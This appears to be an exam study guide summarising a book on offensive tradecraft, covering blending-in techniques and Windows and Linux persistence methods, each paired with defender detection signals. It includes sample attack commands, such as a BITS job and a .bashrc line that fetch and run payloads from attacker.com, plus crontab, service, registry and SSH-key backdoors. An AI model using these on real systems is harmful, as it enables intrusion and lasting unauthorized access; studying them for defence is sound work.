# Bib Study Guide — Adversarial Tradecraft in Cybersecurity (Borges)

> **Bib reference:** *Adversarial Tradecraft in Cybersecurity: Offense Versus Defense in Real-Time Computer Conflict* — Dan Borges (Packt, 2021, ISBN 978-1-80107-814-6).
>
> **Regular-exam scope:** Study topics on **persistence options**.
> **Substitute-exam scope:** Chapter 4.
> **Union — what this guide covers:** Ch 4 (Blending In — operating-in-noise techniques) and the **persistence-options** cluster: registry, services, scheduled tasks, WMI, startup folders, file associations, BITS, accessibility features, shims, boot/logon autostart, credential hijacking, Linux cron / systemd / rc.local, living-off-the-land binaries (LOLBins).

**Posture:** Borges writes dual-perspective — each technique is paired with the defender's detection strategy. This guide mirrors that: each persistence method is named with its blue-team signal. Pairs with `JCAC-ACTIVE-EXPLOIT.md` §9 (Sustaining Access in UNIX/Linux) and `JCAC-WINDOWS.md` §20-21 (Account Management + Scheduling Tasks).

---

## Chapter 4 — Blending In

The core thesis: once you have access, **be indistinguishable from normal operations**. Every unique artifact is a detection opportunity.

### Principles of blending in

1. **Reuse existing tooling** — instead of uploading custom binaries, use what's already on the box.
2. **Mimic normal traffic patterns** — beacon cadence like legitimate telemetry, User-Agents matching local browsers, DNS to expected resolvers.
3. **Match the environment's style** — hostnames, file paths, process names matching local conventions.
4. **Leave the log normal** — appear to be a routine admin user, not a red flag.
5. **Clean up after yourself** — but not in ways that themselves raise alarms (log deletion vs appending).

### Living off the land (LOL-*)

**LOLBins** (Living Off the Land Binaries) — legitimate signed Windows executables that can perform attacker-useful actions.

Examples of LOLBins on Windows:

| Binary | Abuse |
|---|---|
| `powershell.exe` | Script execution, in-memory tooling |
| `cmd.exe` | Basic command execution |
| `wscript.exe` / `cscript.exe` | Run VBScript / JScript |
| `mshta.exe` | Run HTA files (HTML Applications) |
| `rundll32.exe` | Call exported DLL functions — arbitrary code |
| `regsvr32.exe` | COM registration — can fetch and execute remote code |
| `certutil.exe` | Download files (`-urlcache`), base64-decode |
| `bitsadmin.exe` | Background transfer — stealthy download |
| `msiexec.exe` | Install MSIs — including from remote URLs |
| `wmic.exe` | WMI queries + process spawn |
| `schtasks.exe` | Scheduled-task manipulation |
| `net.exe` / `net1.exe` | User, share, session management |
| `netsh.exe` | Network configuration + port forwarding |
| `psexec.exe` (Sysinternals) | Remote exec (legit admin tool; signed) |
| `reg.exe` | Registry read/write |
| `forfiles.exe` | Iterate files + exec command on each |
| `installutil.exe` (.NET) | Install / run .NET assemblies |
| `msbuild.exe` | Build + run in-memory C# from a project file |
| `csc.exe` | C# compiler — produce .exe from attacker code on-target |
| `dotnet.exe` | Run arbitrary .NET assemblies |

Reference catalog: **LOLBAS Project** (https://lolbas-project.github.io/).

On **Linux**, equivalents live in **GTFOBins** (https://gtfobins.github.io/):

| Binary | Abuse when SUID or sudo-permitted |
|---|---|
| `vi` / `vim` / `less` / `more` / `man` | Shell escape inside |
| `find -exec` | Run anything with the privileges of find |
| `awk` | Read/write files and fork commands |
| `python` / `perl` / `ruby` | Language interpreter = code execution |
| `nmap --script` (older versions) | NSE can run arbitrary code |
| `tar --to-command` | Execute command on extracted files |
| `rsync -e` | Specify remote shell |
| `env` | Override LD_PRELOAD etc. |
| `xxd` / `dd` | Read / write arbitrary files |

### Process masquerading

- **Named process** — attacker renames their binary to `svchost.exe` / `explorer.exe` / `kworker/0:0`.
- **Parent PID spoofing** — on Windows via `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`; makes a process appear spawned by another.
- **Process hollowing** — create suspended process, unmap its image, map attacker's image, resume; process appears legitimate in Task Manager.
- **Process doppelgänging / herpaderping** — NTFS transaction + image-mapping tricks to make the on-disk file disagree with the in-memory image.

### Defender signals for process masquerade

- Process-image path doesn't match expected (legitimate `svchost.exe` lives at `C:\Windows\System32\svchost.exe` only).
- Parent-child relationships that are unusual (`winword.exe` spawning `powershell.exe`).
- Digital signature missing or mismatched.
- Unexpected command-line arguments (encoded PowerShell, `-nop -w hidden -enc ...`).
- Memory-section mismatches vs the on-disk image (EDR telemetry).

### Timing tradecraft

- **Beacon jitter** — randomize intervals ±N% so defenders' periodicity detectors don't flag.
- **Sleep obfuscation** — encrypt beacon payload in memory when sleeping so memory scanners don't catch idle-state signatures (classic: Cobalt Strike's `Sleep_Mask`).
- **Work during business hours** — blend with user activity, not 3 AM anomalies.

### C2 blending

- **HTTPS over 443** — universal and often unexamined outbound.
- **Domain fronting** (historical) — SNI says legit CDN, Host header says attacker — largely dead as providers disabled it.
- **Trusted SaaS abuse** — Slack, Discord, Telegram, GitHub, Dropbox, Office 365 Graph as C2 channels. Outbound TLS to trusted FQDN.
- **DNS tunneling** — slow but universal. Defender signals: long subdomain labels, high TXT query volume, no clicks-through to the "web site."
- **ICMP tunneling** — covert channel for low-volume C2.
- **Steganography** — hide bytes in images / network metadata.

### User-Agent and HTTP header hygiene

Attacker tools must send realistic browser User-Agents, `Accept-Encoding: gzip, br`, reasonable `Accept-Language`, and cookie churn that matches real browsing.

---

## Persistence options (Regular-exam scope)

Persistence is the attacker's **second most-important objective** after initial access. The goal: survive reboots, patching, credential rotations, and analyst glances.

### Windows persistence mechanisms

#### Registry Run keys

Keys executed on login:

| Key | User-scope? |
|---|---|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Current user — one-shot |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | All users — one-shot |
| `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run` | 32-bit on 64-bit Windows |

Defender: **Autoruns** (Sysinternals), registry audit via Sysmon Event ID 13 (RegistryEventValueSet).

#### Startup folders

Per-user: `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\`.
All-users: `%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\`.

Shortcut or binary placed here runs on login.

Defender: File-integrity monitoring on startup folders; EDR file-create events.

#### Scheduled tasks

`schtasks /create` or Task Scheduler UI. Triggers: at login, at startup, periodic, on event.

```
schtasks /create /tn "Updater" /tr "C:\temp\x.exe" /sc onlogon /ru SYSTEM
```

Task definitions in `%SystemRoot%\System32\Tasks\` XML files.

Defender: Task Scheduler operational log (Event IDs 106 created, 140 updated, 141 deleted); SCHTASKS command-line auditing via Sysmon.

#### Services

Create a Windows service pointing at attacker binary:

```
sc create "UpdaterSvc" binPath= "C:\temp\x.exe" start= auto
```

Or an **unquoted service path** (`C:\Program Files\Vendor Name\svc.exe`) — Windows tries `C:\Program.exe` first; attacker places binary there.

Defender: Services created outside normal software-install windows; signed-binary checks; Sysmon Event ID 6 (driver/service loaded).

#### WMI event subscriptions

Persistent WMI event subscription — **filter** + **consumer** + **binding** — can execute code on any event (user login, process start, specific time). Runs as SYSTEM.

```
# (Conceptual — abused by threat actors via PowerShell cmdlets)
New-CimInstance __EventFilter ...
New-CimInstance CommandLineEventConsumer ...
New-CimInstance __FilterToConsumerBinding ...
```

Defender: `Get-WMIObject -Namespace root\subscription -Class __EventFilter` audits; Sysmon Events 19/20/21 detect WMI persistence.

#### Boot / logon autostart

- **Logon scripts** — `HKCU\Environment\UserInitMprLogonScript`.
- **Winlogon notification packages** — legacy mechanism still abusable.
- **Shell replacement** — `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` set to attacker executable instead of `explorer.exe`.
- **Boot kit** — modify MBR / UEFI loader to run attacker code before OS.

#### Image File Execution Options (IFEO)

Set a **Debugger** value to redirect launching of any named EXE:

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
Debugger = cmd.exe
```

Now pressing Shift five times at the login screen launches `cmd.exe` as SYSTEM — the classic **sticky-keys backdoor**. IFEO abuse detected by AV/EDR.

#### AppInit / AppCert DLLs

Historical — DLLs loaded into every user32-linked process. Blocked by modern Windows unless DriverSigning disabled.

#### COM hijacking

Register an attacker-controlled DLL as a COM class ID that's loaded by a legitimate process.

```
HKCU\Software\Classes\CLSID\{guid}\InProcServer32 = C:\temp\evil.dll
```

When a process instantiates that COM object, the attacker's DLL loads. HKCU hijacks supersede HKLM at resolve time.

Defender: Autoruns detects these; Sysmon Event ID 7 (image loaded) shows the odd DLL load.

#### Accessibility features ("sticky keys" style)

Replace `C:\Windows\System32\sethc.exe` (or `utilman.exe`, `osk.exe`, `Magnify.exe`) with `cmd.exe`. At login screen, invoke via keyboard shortcut → SYSTEM shell.

Defender: FIM on System32 for these binaries; EDR detects the replacement.

#### BITS jobs

Background Intelligent Transfer Service queues. Attacker creates a BITS job that:
- Downloads files over HTTPS (stealthy — BITS is a normal Windows service).
- Runs a `/SetNotifyCmdLine` program on completion.

```
bitsadmin /create /job
bitsadmin /addfile job http://attacker.com/payload.exe C:\temp\x.exe
bitsadmin /setnotifycmdline job C:\temp\x.exe NULL
bitsadmin /resume job
```

Detected via Microsoft-Windows-Bits-Client/Operational event log.

#### Credential hijacking for persistence

- **Skeleton Key** — Mimikatz inject a master password into LSASS.
- **Golden Ticket** — forge a Kerberos TGT with the domain `krbtgt` hash. Valid for 10 years.
- **Silver Ticket** — forge a service ticket for a specific service account.
- **DCSync** — masquerade as a DC to replicate the domain hash database.

### Linux persistence mechanisms

#### cron jobs

```
# Per-user
crontab -e
@reboot /home/attacker/bot.sh

# System-wide
echo '* * * * * root /usr/local/bin/evil.sh' >> /etc/crontab

# Anacron catches up missed jobs (offline laptops)
/etc/anacrontab
```

Files to watch: `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.hourly/*`, `/var/spool/cron/*`.

#### systemd units

Create `.service` and `.timer` files — attacker can have a unit fire at boot, on calendar schedule, or on event:

```
# /etc/systemd/system/updater.service
[Unit]
Description=Legitimate Updater

[Service]
ExecStart=/usr/local/bin/updater
Restart=always

[Install]
WantedBy=multi-user.target
```

```
systemctl enable updater.service
```

Defender: `systemctl list-unit-files`; `/etc/systemd/system/` file-integrity monitor.

#### /etc/rc.local (legacy) / /etc/init.d/

On older SysV systems — append commands to `/etc/rc.local` for startup execution. Still honored on many distros for compat.

#### .bashrc / .bash_profile / .profile

Attacker adds shell commands that execute at every interactive login of the user. Works for any user with an interactive shell.

```
echo 'bash -c "curl https://attacker.com/x | bash" &' >> ~/.bashrc
```

Defender: FIM on home-directory dotfiles; shell audit via auditd.

#### SSH authorized_keys

Attacker drops a public key into `~/.ssh/authorized_keys` for any user they've compromised. Persists across password changes.

```
echo "ssh-ed25519 AAAA..." >> ~alice/.ssh/authorized_keys
```

Defender: FIM on `~/*/.ssh/authorized_keys`; compare against a known baseline.

#### SUID binary

Attacker plants a SUID root copy of `/bin/sh` (or custom shell) in an obscure path. Any unprivileged exec gets a root shell.

Defender: baseline SUID inventory, alert on additions — `find / -perm -4000 -type f 2>/dev/null`.

#### PAM module injection

Add a malicious PAM module to `/etc/pam.d/sshd` (or similar) that logs passwords or accepts a master password. Sits under the LSM; affects every auth through that service.

#### LD_PRELOAD / /etc/ld.so.preload

Load an attacker shared library into every dynamically-linked process — hooks libc functions like `readdir` to hide files, `getpwnam` to hide users, `accept` to log connections.

Defender: `/etc/ld.so.preload` should typically not exist; its presence is a strong signal. Audit via FIM.

#### Kernel module (LKM) rootkit

`insmod attacker.ko` — kernel rootkit can hide processes, files, sockets, even itself. Detection via memory forensics (Volatility's `linux_check_syscall`, `linux_hidden_modules`).

Defender: signed-module enforcement (`CONFIG_MODULE_SIG_FORCE`), `kernel.modules_disabled=1` after boot.

#### Container / orchestrator persistence

- Kubernetes: CronJob, DaemonSet, malicious admission controller webhook.
- Docker: modify image; privileged container with host-mount.

---

## Cross-book connections

- Windows persistence ↔ `JCAC-WINDOWS.md` §10 (Services) · §20 (Accounts) · §21 (Scheduling Tasks) · `BOOK-WIN-INTERNALS-2.md` Ch 13 (Startup).
- Linux persistence ↔ `JCAC-UNIX-LINUX.md` §5 (Advanced commands) · §12 (Auth/Authz) · §22 (IPtables defense).
- WMI + scheduled tasks ↔ `JCAC-WINDOWS.md` §6 (Logging event IDs).
- MITRE ATT&CK mappings: TA0003 Persistence; T1547 Boot or Logon Autostart; T1543 Create or Modify System Process; T1053 Scheduled Task/Job; T1546 Event Triggered Execution.

---

## Exam-testable concepts (rapid-fire)

### Blending In (Ch 4)

- **LOLBin category 1-word name?** Living Off the Land Binaries (Windows LOLBAS / Linux GTFOBins).
- **Canonical Windows LOLBin for in-memory scripting?** `powershell.exe`.
- **Windows LOLBin to download a file via HTTP?** `certutil -urlcache -f <url> <out>` or `bitsadmin` or `curl.exe` (modern Windows).
- **Windows LOLBin to register a DLL?** `regsvr32.exe`.
- **Windows LOLBin to run an HTA?** `mshta.exe`.
- **LOLBIN to compile C# on-target?** `csc.exe` or `msbuild.exe`.
- **Defender project cataloging Windows LOLBins?** LOLBAS Project.
- **Linux equivalent catalog for SUID / sudo abuse?** GTFOBins.
- **Process hollowing creates a process how?** Suspended, unmap image, map attacker image, resume.
- **Sleep obfuscation defeats?** Memory scanners catching idle beacon signatures.
- **Domain fronting (largely dead) uses?** Mismatch between TLS SNI and HTTP Host header to route through a CDN.

### Windows Persistence

- **Registry Run key for current user?** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
- **Registry Run key for all users?** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`.
- **User startup folder path?** `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\`.
- **Tool to enumerate Windows autostart?** Autoruns (Sysinternals).
- **Schedule a task on user logon?** `schtasks /create /sc onlogon ...`.
- **Create a service with auto-start?** `sc create <name> binPath= "<path>" start= auto`.
- **Unquoted service path vulnerability exploits?** Windows tries intermediate paths when service binary path has spaces and no quotes.
- **WMI persistence components?** `__EventFilter` + `CommandLineEventConsumer` (or `ActiveScriptEventConsumer`) + `__FilterToConsumerBinding`.
- **IFEO sticky-keys persistence abuses which binary?** `sethc.exe` (or `utilman.exe`, `osk.exe`) as Debugger value — launches at login screen.
- **BITS persistence creates?** A BITS job that downloads a file and sets a notify command line to run it.
- **Golden Ticket requires?** The `krbtgt` account's NT hash.
- **DCSync attack uses?** Directory Replication Service (DRS) Get-NCChanges API — requires "Replicate directory changes" privilege.

### Linux Persistence

- **cron job for reboot start?** `@reboot` keyword in crontab.
- **systemd unit file location?** `/etc/systemd/system/` (local) or `/lib/systemd/system/` (distro).
- **Legacy startup script still honored?** `/etc/rc.local`.
- **User interactive-login persistence file?** `~/.bashrc` or `~/.bash_profile`.
- **Persistent SSH access trivially?** Append attacker pubkey to target user's `~/.ssh/authorized_keys`.
- **Systemwide library hooking file?** `/etc/ld.so.preload`.
- **Commands to find SUID binaries?** `find / -perm -4000 -type f 2>/dev/null`.
- **Kernel module persistence sysctl defense?** `kernel.modules_disabled=1`.
- **PAM module injected into which service for SSH password capture?** `/etc/pam.d/sshd` (or `common-auth`).
- **LKM rootkit detected via?** Memory forensics (Volatility) + signed-module enforcement.

---

## Cross-references

- **[Adversarial Tradecraft in Cybersecurity](../references/Adversarial%20Tradecraft%20in%20Cybersecurity-9781801076203.pdf)** — text on disk.
- **[LOLBAS Project](https://lolbas-project.github.io/)** — Windows living-off-the-land binaries.
- **[GTFOBins](https://gtfobins.github.io/)** — UNIX/Linux SUID/sudo abuse.
- **[MITRE ATT&CK — Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/)**.
- **[Microsoft Sysinternals Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)**.
- **[Sysmon for Windows](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)**.
- **[OWASP CheatSheet — Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)**.
- `JCAC-WINDOWS.md` · `JCAC-UNIX-LINUX.md` · `JCAC-ACTIVE-EXPLOIT.md` · `BOOK-WIN-INTERNALS-2.md`.
